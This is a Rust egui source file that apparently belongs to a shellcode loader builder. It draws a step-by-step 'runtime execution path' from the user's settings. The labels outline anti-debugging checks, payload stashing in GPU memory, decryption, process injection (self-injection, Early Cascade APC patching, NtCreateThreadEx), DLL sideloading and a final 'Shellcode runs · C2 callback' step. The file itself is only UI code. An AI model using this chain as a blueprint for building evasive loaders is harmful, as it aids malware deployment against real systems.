use super::state::UiState;
use super::theme::{self, palette, space};
use super::widgets::{step_card, StepAccent, StepView};
use crate::spec::{CheckId, LoaderKindSel, OutputFormSel, RemoteMethod};
use eframe::egui::{self, RichText};

struct Step {
    title: String,
    pill: String,
    accent: StepAccent,
}

pub fn draw(ui: &mut egui::Ui, st: &UiState) {
    egui::ScrollArea::vertical()
        .auto_shrink([false, false])
        .show(ui, |ui| {
            ui.set_min_width(ui.available_width());
            ui.label(
                RichText::new("Runtime execution path")
                    .font(theme::font_sans(16.0))
                    .color(palette::text())
                    .strong(),
            );
            ui.add_space(space::MD);

            for (i, s) in compute(st).iter().enumerate() {
                step_card(
                    ui,
                    &StepView {
                        idx: (i + 1) as u32,
                        title: &s.title,
                        pill_text: &s.pill,
                        accent: s.accent,
                    },
                );
                ui.add_space(space::XS + 2.0);
            }

            ui.add_space(space::MD);
        });
}

fn compute(st: &UiState) -> Vec<Step> {
    let mut out: Vec<Step> = Vec::new();

    out.push(Step {
        title: "Loader starts".into(),
        pill: "ENTRY".into(),
        accent: StepAccent::Normal,
    });

    for (id, on) in &st.checks_on {
        if !on {
            continue;
        }
        let (title, pill) = match id {
            CheckId::CheckRemote => ("Remote debugger probe", "DBG-OBJ"),
            CheckId::DebugPort   => ("Process debug port",    "DBG-PORT"),
            CheckId::TebFlag     => ("PEB BeingDebugged",     "PEB"),
            CheckId::VecInt3     => ("Vectored INT3 trap",    "VEH"),
            CheckId::NtDelay     => ("NtDelayExecution nap",  "NAP"),
        };
        out.push(Step {
            title: title.into(),
            pill: pill.into(),
            accent: StepAccent::Danger,
        });
    }

    if st.gpu_storage && matches!(st.loader, LoaderKindSel::SelfInject) {
        out.push(Step {
            title: "Probe NVIDIA + stash to VRAM".into(),
            pill: "GPU".into(),
            accent: StepAccent::Warn,
        });
        out.push(Step {
            title: "Pull from VRAM + free context".into(),
            pill: "GPU".into(),
            accent: StepAccent::Warn,
        });
    }

    out.push(Step {
        title: format!("Decrypt via {}", st.encryption.label().to_uppercase()),
        pill: st.encryption.label().to_uppercase(),
        accent: StepAccent::Normal,
    });

    match st.loader {
        LoaderKindSel::SelfInject => {
            out.push(Step {
                title: "Allocate RW · Write · Reprotect RX".into(),
                pill: "RW → RX".into(),
                accent: StepAccent::Danger,
            });
            out.push(Step {
                title: format!("Detonate via {}", st.selfinject_method.label()),
                pill: short_pill(st.selfinject_method.label()),
                accent: StepAccent::Normal,
            });
            if matches!(st.output, OutputFormSel::DllSideload) {
                out.push(Step {
                    title: "DLL hijacked export gates detonate()".into(),
                    pill: "SIDELOAD".into(),
                    accent: StepAccent::Normal,
                });
            }
        }
        LoaderKindSel::Remote => {
            let target = if st.target_exe.is_empty() {
                "Notepad.exe".into()
            } else {
                st.target_exe.clone()
            };
            out.push(Step {
                title: format!("Spawn {target} suspended"),
                pill: "SUSP".into(),
                accent: StepAccent::Normal,
            });
            match st.remote_method {
                RemoteMethod::EarlyCascade => {
                    out.push(Step {
                        title: "Scan ntdll for SE_DllLoaded + ShimsEnabled".into(),
                        pill: "NTDLL".into(),
                        accent: StepAccent::Normal,
                    });
                    out.push(Step {
                        title: "Patch APC stub + encode pointer".into(),
                        pill: "APC".into(),
                        accent: StepAccent::Danger,
                    });
                    out.push(Step {
                        title: "Resume thread".into(),
                        pill: "RESUME".into(),
                        accent: StepAccent::Normal,
                    });
                }
                RemoteMethod::NtCreateThreadEx => {
                    out.push(Step {
                        title: "NtAllocate · NtWrite · NtProtect".into(),
                        pill: "RW → RX".into(),
                        accent: StepAccent::Danger,
                    });
                    out.push(Step {
                        title: "NtCreateThreadEx".into(),
                        pill: "THREAD".into(),
                        accent: StepAccent::Normal,
                    });
                }
            }
        }
    }

    out.push(Step {
        title: "Shellcode runs · C2 callback".into(),
        pill: "DETONATE".into(),
        accent: StepAccent::Danger,
    });

    out
}

fn short_pill(method_label: &str) -> String {
    match method_label {
        "FIBER SWITCH"       => "FIBER".into(),
        "EnumCalendarInfoA"  => "CALENDAR".into(),
        "EnumDesktopsW"      => "DESKTOPS".into(),
        "EnumWindowStationsW"=> "WINSTA".into(),
        "EnumSystemGeoID"    => "GEOID".into(),
        other                => other.to_uppercase(),
    }
}
